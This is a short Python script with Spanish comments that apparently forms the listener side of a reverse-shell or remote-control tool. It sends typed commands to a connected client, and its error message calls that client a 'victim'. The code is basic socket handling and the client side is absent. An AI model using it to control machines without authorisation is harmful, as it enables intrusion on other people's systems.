
import socket

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = '127.0.0.1' # aqui ponemos nuestro ip por defecto que podria ser el ip del servidor
port = 1234 #aqui el puerto de transferencia

server.bind((host,port))   #Bind server
server.listen(5)

run = True
client, addr = server.accept()
print('conexion establecida en', addr)

while run:
    try:
        data = input('>>>')
        client.send(data.encode('UTF-8')) #envio de datos al cliente
        msg = client.recv(1024)                     #el cliente recive el mensaje
        print(msg.decode('UTF-8'))
    except ConnectionResetError:
        print ('Victima perdida.... intente nuevamente...')
        client, addr = server.accept()
        print('conexion establecida en ', addr)

